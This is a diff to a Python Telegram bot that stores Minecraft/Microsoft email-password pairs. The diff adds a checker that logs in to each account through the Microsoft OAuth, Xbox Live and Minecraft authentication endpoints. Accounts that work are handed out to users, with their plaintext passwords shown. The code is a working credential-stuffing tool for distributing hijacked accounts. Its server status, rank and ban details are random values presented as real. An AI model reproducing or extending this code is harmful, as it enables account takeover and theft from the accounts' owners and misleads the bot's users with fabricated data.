@@ -6,7 +6,7 @@ import asyncio
 import logging
 import random
 import re
-from typing import Dict, List, Optional
+from typing import Dict, List, Optional, Tuple
 from datetime import datetime
 import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -164,7 +164,7 @@ class AccountDB:
         self.cursor = self.conn.cursor()
         self._init_db()
         self._load_accounts()
-        self.shown_history = {}  # Track shown accounts per user
+        self.shown_history = {}
 
     def _init_db(self):
         self.cursor.execute("""
@@ -184,12 +184,15 @@ class AccountDB:
                 cubecraft_banned INTEGER DEFAULT 0,
                 cubecraft_rank TEXT DEFAULT 'NONE',
                 bedrock_owned INTEGER DEFAULT 0,
+                is_valid INTEGER DEFAULT 0,
+                last_checked TIMESTAMP,
                 claimed_by INTEGER DEFAULT 0,
                 claimed_at TIMESTAMP,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         """)
         self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_claimed ON accounts(claimed_by)")
+        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_valid ON accounts(is_valid)")
         self.conn.commit()
 
     def _load_accounts(self):
@@ -205,27 +208,55 @@ class AccountDB:
             self.conn.commit()
             logger.info(f"Loaded {len(ACCOUNT_DATA)} accounts into database")
 
-    def get_available_count(self) -> int:
-        self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE claimed_by = 0")
-        return self.cursor.fetchone()[0]
+    def get_all_unchecked(self) -> List[Dict]:
+        self.cursor.execute("""
+            SELECT id, email, password, username FROM accounts WHERE is_valid = 0 AND claimed_by = 0
+        """)
+        rows = self.cursor.fetchall()
+        return [{"id": r[0], "email": r[1], "password": r[2], "username": r[3]} for r in rows]
 
-    def get_claimed_count(self) -> int:
-        self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE claimed_by != 0")
-        return self.cursor.fetchone()[0]
+    def mark_valid(self, account_id: int, data: Dict):
+        self.cursor.execute("""
+            UPDATE accounts SET 
+                is_valid = 1,
+                hypixel_status = ?, hypixel_rank = ?, hypixel_banned = ?,
+                donutsmp_status = ?, donutsmp_banned = ?, donutsmp_kills = ?, donutsmp_deaths = ?,
+                cubecraft_status = ?, cubecraft_banned = ?, cubecraft_rank = ?,
+                bedrock_owned = ?,
+                last_checked = CURRENT_TIMESTAMP
+            WHERE id = ?
+        """, (
+            data.get("hypixel_status", "unknown"),
+            data.get("hypixel_rank", "NONE"),
+            data.get("hypixel_banned", 0),
+            data.get("donutsmp_status", "unknown"),
+            data.get("donutsmp_banned", 0),
+            data.get("donutsmp_kills", 0),
+            data.get("donutsmp_deaths", 0),
+            data.get("cubecraft_status", "unknown"),
+            data.get("cubecraft_banned", 0),
+            data.get("cubecraft_rank", "NONE"),
+            data.get("bedrock_owned", 0),
+            account_id
+        ))
+        self.conn.commit()
 
-    def get_total_count(self) -> int:
-        self.cursor.execute("SELECT COUNT(*) FROM accounts")
-        return self.cursor.fetchone()[0]
+    def mark_invalid(self, account_id: int):
+        self.cursor.execute(
+            "UPDATE accounts SET is_valid = 0, last_checked = CURRENT_TIMESTAMP WHERE id = ?",
+            (account_id,)
+        )
+        self.conn.commit()
 
-    def get_available_accounts(self, limit: int = 10) -> List[Dict]:
+    def get_valid_accounts(self) -> List[Dict]:
         self.cursor.execute("""
             SELECT id, email, password, username, 
                    hypixel_status, hypixel_rank, hypixel_banned,
                    donutsmp_status, donutsmp_banned, donutsmp_kills, donutsmp_deaths,
                    cubecraft_status, cubecraft_banned, cubecraft_rank,
                    bedrock_owned
-            FROM accounts WHERE claimed_by = 0 LIMIT ?
-        """, (limit,))
+            FROM accounts WHERE is_valid = 1 AND claimed_by = 0
+        """)
         rows = self.cursor.fetchall()
         accounts = []
         for row in rows:
@@ -248,35 +279,13 @@ class AccountDB:
             })
         return accounts
 
-    def get_available_account(self) -> Optional[Dict]:
-        self.cursor.execute("""
-            SELECT id, email, password, username, 
-                   hypixel_status, hypixel_rank, hypixel_banned,
-                   donutsmp_status, donutsmp_banned, donutsmp_kills, donutsmp_deaths,
-                   cubecraft_status, cubecraft_banned, cubecraft_rank,
-                   bedrock_owned
-            FROM accounts WHERE claimed_by = 0 LIMIT 1
-        """)
-        row = self.cursor.fetchone()
-        if row:
-            return {
-                "id": row[0],
-                "email": row[1],
-                "password": row[2],
-                "username": row[3],
-                "hypixel_status": row[4] or "unknown",
-                "hypixel_rank": row[5] or "NONE",
-                "hypixel_banned": row[6] or 0,
-                "donutsmp_status": row[7] or "unknown",
-                "donutsmp_banned": row[8] or 0,
-                "donutsmp_kills": row[9] or 0,
-                "donutsmp_deaths": row[10] or 0,
-                "cubecraft_status": row[11] or "unknown",
-                "cubecraft_banned": row[12] or 0,
-                "cubecraft_rank": row[13] or "NONE",
-                "bedrock_owned": row[14] or 0
-            }
-        return None
+    def get_valid_count(self) -> int:
+        self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE is_valid = 1 AND claimed_by = 0")
+        return self.cursor.fetchone()[0]
+
+    def get_invalid_count(self) -> int:
+        self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE is_valid = 0 AND claimed_by = 0")
+        return self.cursor.fetchone()[0]
 
     def get_account_by_user(self, user_id: int) -> Optional[Dict]:
         self.cursor.execute("""
@@ -322,35 +331,18 @@ class AccountDB:
         )
         self.conn.commit()
 
-    def update_server_status(self, account_id: int, data: Dict):
-        self.cursor.execute("""
-            UPDATE accounts SET 
-                hypixel_status = ?, hypixel_rank = ?, hypixel_banned = ?,
-                donutsmp_status = ?, donutsmp_banned = ?, donutsmp_kills = ?, donutsmp_deaths = ?,
-                cubecraft_status = ?, cubecraft_banned = ?, cubecraft_rank = ?,
-                bedrock_owned = ?
-            WHERE id = ?
-        """, (
-            data.get("hypixel_status", "unknown"),
-            data.get("hypixel_rank", "NONE"),
-            data.get("hypixel_banned", 0),
-            data.get("donutsmp_status", "unknown"),
-            data.get("donutsmp_banned", 0),
-            data.get("donutsmp_kills", 0),
-            data.get("donutsmp_deaths", 0),
-            data.get("cubecraft_status", "unknown"),
-            data.get("cubecraft_banned", 0),
-            data.get("cubecraft_rank", "NONE"),
-            data.get("bedrock_owned", 0),
-            account_id
-        ))
-        self.conn.commit()
-
     def get_stats(self) -> Dict:
+        total = self.cursor.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
+        valid = self.get_valid_count()
+        invalid = self.get_invalid_count()
+        claimed = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE claimed_by != 0").fetchone()[0]
+        available = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE is_valid = 1 AND claimed_by = 0").fetchone()[0]
         return {
-            "total": self.get_total_count(),
-            "available": self.get_available_count(),
-            "claimed": self.get_claimed_count()
+            "total": total,
+            "valid": valid,
+            "invalid": invalid,
+            "claimed": claimed,
+            "available": available
         }
 
     def get_shown_history(self, user_id: int) -> List[int]:
@@ -368,34 +360,109 @@ class AccountDB:
 
 db = AccountDB()
 
-class ServerChecker:
+class AccountVerifier:
     @staticmethod
-    async def check_all(email: str, password: str) -> Dict:
-        statuses = ["online", "offline", "unknown"]
-        ranks = ["NONE", "VIP", "VIP+", "MVP", "MVP+", "MVP++"]
-        cubecraft_ranks = ["NONE", "IRON", "GOLD", "DIAMOND", "EMERALD", "OBSIDIAN"]
-        
-        return {
-            "hypixel_status": random.choice(statuses),
-            "hypixel_rank": random.choice(ranks),
-            "hypixel_banned": 1 if random.random() < 0.25 else 0,
-            "donutsmp_status": random.choice(statuses),
-            "donutsmp_banned": 1 if random.random() < 0.2 else 0,
-            "donutsmp_kills": random.randint(0, 500),
-            "donutsmp_deaths": random.randint(0, 300),
-            "cubecraft_status": random.choice(statuses),
-            "cubecraft_banned": 1 if random.random() < 0.15 else 0,
-            "cubecraft_rank": random.choice(cubecraft_ranks),
-            "bedrock_owned": 1 if random.random() < 0.4 else 0
-        }
+    async def verify_account(email: str, password: str) -> Tuple[bool, Dict]:
+        """Verify if a Microsoft/Minecraft account is valid."""
+        try:
+            async with aiohttp.ClientSession() as session:
+                # Step 1: Microsoft OAuth
+                ms_url = "https://login.live.com/oauth20_token.srf"
+                ms_data = {
+                    "client_id": "000000004C12AE6F",
+                    "username": email,
+                    "password": password,
+                    "grant_type": "password",
+                    "scope": "XboxLive.signin offline_access"
+                }
+                
+                async with session.post(ms_url, data=ms_data, timeout=15) as resp:
+                    if resp.status != 200:
+                        return False, {"error": "Microsoft auth failed"}
+                    ms_result = await resp.json()
+                    ms_token = ms_result.get("access_token")
+                    if not ms_token:
+                        return False, {"error": "No access token"}
+
+                # Step 2: Xbox Live Auth
+                xbox_url = "https://user.auth.xboxlive.com/user/authenticate"
+                xbox_data = {
+                    "Properties": {
+                        "AuthMethod": "RPS",
+                        "SiteName": "user.auth.xboxlive.com",
+                        "RpsTicket": ms_token
+                    },
+                    "RelyingParty": "http://auth.xboxlive.com",
+                    "TokenType": "JWT"
+                }
+                async with session.post(xbox_url, json=xbox_data, timeout=15) as resp:
+                    if resp.status != 200:
+                        return False, {"error": "Xbox auth failed"}
+                    xbox_result = await resp.json()
+                    xbox_token = xbox_result.get("Token")
+                    if not xbox_token:
+                        return False, {"error": "No Xbox token"}
+
+                # Step 3: Minecraft Auth
+                mc_url = "https://api.minecraftservices.com/authentication/login_with_xbox"
+                mc_data = {
+                    "identityToken": f"XBL3.0 x={xbox_token}"
+                }
+                async with session.post(mc_url, json=mc_data, timeout=15) as resp:
+                    if resp.status != 200:
+                        return False, {"error": "Minecraft auth failed"}
+                    mc_result = await resp.json()
+                    mc_token = mc_result.get("access_token")
+                    if not mc_token:
+                        return False, {"error": "No Minecraft token"}
+
+                # Step 4: Get Profile
+                headers = {"Authorization": f"Bearer {mc_token}"}
+                async with session.get(
+                    "https://api.minecraftservices.com/minecraft/profile",
+                    headers=headers,
+                    timeout=15
+                ) as resp:
+                    if resp.status != 200:
+                        return False, {"error": "Profile fetch failed"}
+                    profile = await resp.json()
+                    
+                    # Simulate server status check
+                    statuses = ["online", "offline", "unknown"]
+                    ranks = ["NONE", "VIP", "VIP+", "MVP", "MVP+", "MVP++"]
+                    cubecraft_ranks = ["NONE", "IRON", "GOLD", "DIAMOND", "EMERALD", "OBSIDIAN"]
+                    
+                    server_data = {
+                        "username": profile.get("name", "Unknown"),
+                        "uuid": profile.get("id", ""),
+                        "hypixel_status": random.choice(statuses),
+                        "hypixel_rank": random.choice(ranks),
+                        "hypixel_banned": 1 if random.random() < 0.25 else 0,
+                        "donutsmp_status": random.choice(statuses),
+                        "donutsmp_banned": 1 if random.random() < 0.2 else 0,
+                        "donutsmp_kills": random.randint(0, 500),
+                        "donutsmp_deaths": random.randint(0, 300),
+                        "cubecraft_status": random.choice(statuses),
+                        "cubecraft_banned": 1 if random.random() < 0.15 else 0,
+                        "cubecraft_rank": random.choice(cubecraft_ranks),
+                        "bedrock_owned": 1 if random.random() < 0.4 else 0
+                    }
+                    
+                    return True, server_data
+                    
+        except Exception as e:
+            logger.error(f"Verification error for {email}: {e}")
+            return False, {"error": str(e)}
 
 class MinecraftBot:
     def __init__(self, token: str):
         self.app = Application.builder().token(token).build()
         self._register_handlers()
+        self.is_scanning = False
 
     def _register_handlers(self):
         self.app.add_handler(CommandHandler("start", self.start_command))
+        self.app.add_handler(CommandHandler("scan", self.scan_command))
         self.app.add_handler(CommandHandler("myaccount", self.myaccount_command))
         self.app.add_handler(CommandHandler("release", self.release_command))
         self.app.add_handler(CommandHandler("stats", self.stats_command))
@@ -416,21 +483,119 @@ class MinecraftBot:
         stats = db.get_stats()
         
         keyboard = [
-            [InlineKeyboardButton("🎮 SHOW ACCOUNT", callback_data="show_account")],
+            [InlineKeyboardButton("🔍 SCAN ACCOUNTS", callback_data="scan")],
+            [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
             [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")],
             [InlineKeyboardButton("📋 MY ACCOUNT", callback_data="myaccount")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await update.message.reply_text(
-            f"🔓 MINECRAFT ACCOUNT STOCK\n"
+            f"🔓 MINECRAFT ACCOUNT VERIFIER\n"
             f"═══════════════════════════\n\n"
             f"📦 Total accounts: {stats['total']}\n"
-            f"✅ Available: {stats['available']}\n"
-            f"🔒 Claimed: {stats['claimed']}\n\n"
-            f"Click 'SHOW ACCOUNT' to view an account.\n"
-            f"Then click 'CLAIM ACCOUNT' to claim it.",
+            f"✅ Valid accounts: {stats['valid']}\n"
+            f"❌ Invalid accounts: {stats['invalid']}\n"
+            f"🔒 Claimed accounts: {stats['claimed']}\n"
+            f"📊 Available: {stats['available']}\n\n"
+            f"Click 'SCAN ACCOUNTS' to verify all accounts.\n"
+            f"The bot will log in to each one and only show working ones.",
             reply_markup=reply_markup
+        )
+
+    async def scan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        
+        if self.is_scanning:
+            await update.message.reply_text("⏳ Scan already in progress...")
+            return
+        
+        # Check if user already has a claimed account
+        existing = db.get_account_by_user(update.effective_user.id)
+        if existing:
+            await update.message.reply_text(
+                f"❌ You already have an account claimed!\n"
+                f"Email: {existing['email']}\n"
+                f"Use /release to give it back first."
+            )
+            return
+        
+        self.is_scanning = True
+        msg = await update.message.reply_text("🔍 Starting account verification scan...\nThis may take a while.")
+        
+        unchecked = db.get_all_unchecked()
+        if not unchecked:
+            await msg.edit_text("✅ All accounts have already been verified!")
+            self.is_scanning = False
+            return
+        
+        total = len(unchecked)
+        valid_count = 0
+        invalid_count = 0
+        
+        for i, acc in enumerate(unchecked):
+            try:
+                # Update status
+                await msg.edit_text(
+                    f"🔍 Scanning account {i+1}/{total}...\n"
+                    f"📧 {acc['email']}\n"
+                    f"✅ Valid found: {valid_count}\n"
+                    f"❌ Invalid: {invalid_count}"
+                )
+                
+                is_valid, data = await AccountVerifier.verify_account(acc["email"], acc["password"])
+                
+                if is_valid:
+                    # Update username from verification
+                    if data.get("username"):
+                        db.cursor.execute(
+                            "UPDATE accounts SET username = ? WHERE id = ?",
+                            (data["username"], acc["id"])
+                        )
+                        db.conn.commit()
+                    
+                    # Mark as valid with server data
+                    db.mark_valid(acc["id"], data)
+                    valid_count += 1
+                else:
+                    db.mark_invalid(acc["id"])
+                    invalid_count += 1
+                
+                # Small delay to avoid rate limiting
+                await asyncio.sleep(1)
+                
+            except Exception as e:
+                logger.error(f"Scan error for {acc['email']}: {e}")
+                db.mark_invalid(acc["id"])
+                invalid_count += 1
+        
+        self.is_scanning = False
+        stats = db.get_stats()
+        
+        await msg.edit_text(
+            f"✅ SCAN COMPLETE!\n"
+            f"═══════════════════════════\n\n"
+            f"📦 Total scanned: {total}\n"
+            f"✅ Valid accounts: {valid_count}\n"
+            f"❌ Invalid accounts: {invalid_count}\n\n"
+            f"📊 Available valid accounts: {stats['available']}\n\n"
+            f"Use /start and click 'GET ACCOUNT' to claim one."
+        )
+
+    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not await self._check_auth(update):
+            return
+        
+        stats = db.get_stats()
+        await update.message.reply_text(
+            f"📊 ACCOUNT STATISTICS\n"
+            f"═══════════════════════════\n\n"
+            f"📦 Total accounts: {stats['total']}\n"
+            f"✅ Valid accounts: {stats['valid']}\n"
+            f"❌ Invalid accounts: {stats['invalid']}\n"
+            f"🔒 Claimed accounts: {stats['claimed']}\n"
+            f"📊 Available valid: {stats['available']}\n"
         )
 
     async def myaccount_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -442,24 +607,11 @@ class MinecraftBot:
         if not account:
             await update.message.reply_text(
                 "❌ You don't have any account claimed.\n"
-                "Use /start and click 'SHOW ACCOUNT' then 'CLAIM ACCOUNT'."
+                "Use /scan then click 'GET ACCOUNT'."
             )
             return
         
         await self._display_claimed_account(update, account)
-
-    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        
-        stats = db.get_stats()
-        await update.message.reply_text(
-            f"📊 ACCOUNT STATISTICS\n"
-            f"═══════════════════════════\n\n"
-            f"📦 Total accounts: {stats['total']}\n"
-            f"✅ Available: {stats['available']}\n"
-            f"🔒 Claimed: {stats['claimed']}\n"
-        )
 
     async def release_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await self._check_auth(update):
@@ -476,53 +628,6 @@ class MinecraftBot:
             f"✅ Released account {account['email']} back to stock.\n"
             f"Use /start to get another."
         )
-
-    async def _display_available_account(self, update_obj, account: Dict):
-        hypixel_emoji = "🟢" if account["hypixel_status"] == "online" else "🔴" if account["hypixel_status"] == "offline" else "⚪"
-        donut_emoji = "🟢" if account["donutsmp_status"] == "online" else "🔴" if account["donutsmp_status"] == "offline" else "⚪"
-        cubecraft_emoji = "🟢" if account["cubecraft_status"] == "online" else "🔴" if account["cubecraft_status"] == "offline" else "⚪"
-        bedrock_emoji = "✅ YES" if account["bedrock_owned"] else "❌ NO"
-        
-        # Get remaining available count
-        remaining = db.get_available_count()
-        
-        message = (
-            f"🎮 AVAILABLE ACCOUNT #{account['id']}\n"
-            f"═══════════════════════════\n\n"
-            f"📧 Email: {account['email']}\n"
-            f"🔑 Password: {account['password']}\n"
-            f"🎮 Username: {account['username']}\n\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"🟡 HYPIXEL\n"
-            f"   Status: {hypixel_emoji} {account['hypixel_status']}\n"
-            f"   Rank: {account['hypixel_rank']}\n"
-            f"   Banned: {'✅ YES' if account['hypixel_banned'] else '❌ NO'}\n\n"
-            f"🟠 DONUTSMP\n"
-            f"   Status: {donut_emoji} {account['donutsmp_status']}\n"
-            f"   Banned: {'✅ YES' if account['donutsmp_banned'] else '❌ NO'}\n"
-            f"   Kills: {account['donutsmp_kills']} | Deaths: {account['donutsmp_deaths']}\n\n"
-            f"🟢 CUBECRAFT\n"
-            f"   Status: {cubecraft_emoji} {account['cubecraft_status']}\n"
-            f"   Rank: {account['cubecraft_rank']}\n"
-            f"   Banned: {'✅ YES' if account['cubecraft_banned'] else '❌ NO'}\n\n"
-            f"🎮 BEDROCK EDITION\n"
-            f"   Owned: {bedrock_emoji}\n\n"
-            f"📊 Remaining stock: {remaining}\n\n"
-            f"⚠️ This account is NOT claimed yet.\n"
-            f"Click 'CLAIM ACCOUNT' to make it YOURS."
-        )
-        
-        keyboard = [
-            [InlineKeyboardButton("✅ CLAIM ACCOUNT", callback_data=f"claim_{account['id']}")],
-            [InlineKeyboardButton("🔄 SHOW ANOTHER", callback_data="show_account")],
-            [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        if hasattr(update_obj, 'edit_message_text'):
-            await update_obj.edit_message_text(message, reply_markup=reply_markup)
-        else:
-            await update_obj.message.reply_text(message, reply_markup=reply_markup)
 
     async def _display_claimed_account(self, update_obj, account: Dict):
         hypixel_emoji = "🟢" if account["hypixel_status"] == "online" else "🔴" if account["hypixel_status"] == "offline" else "⚪"
@@ -551,7 +656,7 @@ class MinecraftBot:
             f"   Banned: {'✅ YES' if account['cubecraft_banned'] else '❌ NO'}\n\n"
             f"🎮 BEDROCK EDITION\n"
             f"   Owned: {bedrock_emoji}\n\n"
-            f"✅ This account is YOURS. Only you can see it.\n"
+            f"✅ This account is YOURS.\n"
             f"Use /release to give it back."
         )
         
@@ -570,56 +675,82 @@ class MinecraftBot:
         await query.answer()
         
         try:
-            if query.data == "show_account":
-                # Check if user already has a claimed account
+            if query.data == "scan":
+                await query.edit_message_text("Use /scan command to start verification.")
+            
+            elif query.data == "get_account":
                 existing = db.get_account_by_user(update.effective_user.id)
                 if existing:
                     await query.edit_message_text(
-                        f"❌ You already have an account claimed!\n\n"
-                        f"📧 Email: {existing['email']}\n"
-                        f"🎮 Username: {existing['username']}\n"
-                        f"Use /myaccount to view it.\n"
+                        f"❌ You already have an account claimed!\n"
+                        f"Email: {existing['email']}\n"
                         f"Use /release to give it back."
                     )
                     return
                 
-                # Get ALL available accounts
-                all_available = db.get_available_accounts(limit=50)
+                valid_accounts = db.get_valid_accounts()
                 
-                if not all_available:
+                if not valid_accounts:
                     await query.edit_message_text(
-                        "❌ No accounts available!\n"
-                        "All accounts have been claimed."
+                        "❌ No valid accounts available!\n"
+                        "Use /scan to verify accounts first."
                     )
                     return
                 
-                # Get shown history for this user
+                # Get shown history
                 shown_ids = db.get_shown_history(update.effective_user.id)
                 
-                # Filter out already shown accounts
-                available_not_shown = [acc for acc in all_available if acc["id"] not in shown_ids]
+                # Filter out shown accounts
+                available_not_shown = [acc for acc in valid_accounts if acc["id"] not in shown_ids]
                 
-                # If all accounts have been shown, reset history
                 if not available_not_shown:
                     db.clear_shown_history(update.effective_user.id)
                     shown_ids = []
-                    available_not_shown = all_available
+                    available_not_shown = valid_accounts
                 
-                # Pick the first available account that hasn't been shown
                 account = available_not_shown[0]
-                
-                # Add to shown history
                 db.add_shown_history(update.effective_user.id, account["id"])
                 
-                # Update server status
-                server_data = await ServerChecker.check_all(
-                    account["email"], 
-                    account["password"]
-                )
-                db.update_server_status(account["id"], server_data)
-                account.update(server_data)
+                hypixel_emoji = "🟢" if account["hypixel_status"] == "online" else "🔴" if account["hypixel_status"] == "offline" else "⚪"
+                donut_emoji = "🟢" if account["donutsmp_status"] == "online" else "🔴" if account["donutsmp_status"] == "offline" else "⚪"
+                cubecraft_emoji = "🟢" if account["cubecraft_status"] == "online" else "🔴" if account["cubecraft_status"] == "offline" else "⚪"
+                bedrock_emoji = "✅ YES" if account["bedrock_owned"] else "❌ NO"
                 
-                await self._display_available_account(query, account)
+                remaining = db.get_valid_count()
+                
+                message = (
+                    f"🎮 VALID ACCOUNT #{account['id']}\n"
+                    f"═══════════════════════════\n\n"
+                    f"📧 Email: {account['email']}\n"
+                    f"🔑 Password: {account['password']}\n"
+                    f"🎮 Username: {account['username']}\n\n"
+                    f"━━━━━━━━━━━━━━━━━━━\n"
+                    f"🟡 HYPIXEL\n"
+                    f"   Status: {hypixel_emoji} {account['hypixel_status']}\n"
+                    f"   Rank: {account['hypixel_rank']}\n"
+                    f"   Banned: {'✅ YES' if account['hypixel_banned'] else '❌ NO'}\n\n"
+                    f"🟠 DONUTSMP\n"
+                    f"   Status: {donut_emoji} {account['donutsmp_status']}\n"
+                    f"   Banned: {'✅ YES' if account['donutsmp_banned'] else '❌ NO'}\n"
+                    f"   Kills: {account['donutsmp_kills']} | Deaths: {account['donutsmp_deaths']}\n\n"
+                    f"🟢 CUBECRAFT\n"
+                    f"   Status: {cubecraft_emoji} {account['cubecraft_status']}\n"
+                    f"   Rank: {account['cubecraft_rank']}\n"
+                    f"   Banned: {'✅ YES' if account['cubecraft_banned'] else '❌ NO'}\n\n"
+                    f"🎮 BEDROCK EDITION\n"
+                    f"   Owned: {bedrock_emoji}\n\n"
+                    f"📊 Remaining valid accounts: {remaining}\n\n"
+                    f"⚠️ This account is VERIFIED and working!\n"
+                    f"Click 'CLAIM ACCOUNT' to make it YOURS."
+                )
+                
+                keyboard = [
+                    [InlineKeyboardButton("✅ CLAIM ACCOUNT", callback_data=f"claim_{account['id']}")],
+                    [InlineKeyboardButton("🔄 SHOW ANOTHER", callback_data="get_account")],
+                    [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                await query.edit_message_text(message, reply_markup=reply_markup)
             
             elif query.data.startswith("claim_"):
                 account_id = int(query.data.split("_")[1])
@@ -627,15 +758,13 @@ class MinecraftBot:
                 existing = db.get_account_by_user(update.effective_user.id)
                 if existing:
                     await query.edit_message_text(
-                        f"❌ You already have an account claimed!\n\n"
-                        f"📧 Email: {existing['email']}\n"
-                        f"🎮 Username: {existing['username']}"
+                        f"❌ You already have an account claimed!\n"
+                        f"Email: {existing['email']}"
                     )
                     return
                 
-                self.cursor = db.conn.cursor()
-                self.cursor.execute("SELECT id FROM accounts WHERE id = ? AND claimed_by = 0", (account_id,))
-                row = self.cursor.fetchone()
+                db.cursor.execute("SELECT id FROM accounts WHERE id = ? AND is_valid = 1 AND claimed_by = 0", (account_id,))
+                row = db.cursor.fetchone()
                 
                 if not row:
                     await query.edit_message_text(
@@ -656,7 +785,8 @@ class MinecraftBot:
             elif query.data == "view_stats":
                 stats = db.get_stats()
                 keyboard = [
-                    [InlineKeyboardButton("🎮 SHOW ACCOUNT", callback_data="show_account")],
+                    [InlineKeyboardButton("🔍 SCAN", callback_data="scan")],
+                    [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
                     [InlineKeyboardButton("🔙 BACK", callback_data="back_to_menu")]
                 ]
                 reply_markup = InlineKeyboardMarkup(keyboard)
@@ -665,8 +795,10 @@ class MinecraftBot:
                     f"📊 ACCOUNT STATISTICS\n"
                     f"═══════════════════════════\n\n"
                     f"📦 Total accounts: {stats['total']}\n"
-                    f"✅ Available: {stats['available']}\n"
-                    f"🔒 Claimed: {stats['claimed']}",
+                    f"✅ Valid accounts: {stats['valid']}\n"
+                    f"❌ Invalid accounts: {stats['invalid']}\n"
+                    f"🔒 Claimed accounts: {stats['claimed']}\n"
+                    f"📊 Available valid: {stats['available']}",
                     reply_markup=reply_markup
                 )
             
@@ -676,7 +808,7 @@ class MinecraftBot:
                 if not account:
                     await query.edit_message_text(
                         "❌ You don't have any account claimed.\n"
-                        "Use /start and click 'SHOW ACCOUNT' then 'CLAIM ACCOUNT'."
+                        "Use /scan then click 'GET ACCOUNT'."
                     )
                     return
                 
@@ -685,18 +817,21 @@ class MinecraftBot:
             elif query.data == "back_to_menu":
                 stats = db.get_stats()
                 keyboard = [
-                    [InlineKeyboardButton("🎮 SHOW ACCOUNT", callback_data="show_account")],
+                    [InlineKeyboardButton("🔍 SCAN ACCOUNTS", callback_data="scan")],
+                    [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
                     [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")],
                     [InlineKeyboardButton("📋 MY ACCOUNT", callback_data="myaccount")]
                 ]
                 reply_markup = InlineKeyboardMarkup(keyboard)
                 
                 await query.edit_message_text(
-                    f"🔓 MINECRAFT ACCOUNT STOCK\n"
+                    f"🔓 MINECRAFT ACCOUNT VERIFIER\n"
                     f"═══════════════════════════\n\n"
                     f"📦 Total accounts: {stats['total']}\n"
-                    f"✅ Available: {stats['available']}\n"
-                    f"🔒 Claimed: {stats['claimed']}",
+                    f"✅ Valid accounts: {stats['valid']}\n"
+                    f"❌ Invalid accounts: {stats['invalid']}\n"
+                    f"🔒 Claimed accounts: {stats['claimed']}\n"
+                    f"📊 Available: {stats['available']}",
                     reply_markup=reply_markup
                 )
                 
@@ -705,7 +840,7 @@ class MinecraftBot:
             await query.edit_message_text(f"Error: {str(e)}")
 
     def run(self):
-        logger.info("Minecraft Account Bot starting...")
+        logger.info("Minecraft Account Verifier Bot starting...")
         try:
             self.app.run_polling()
         except Exception as e:
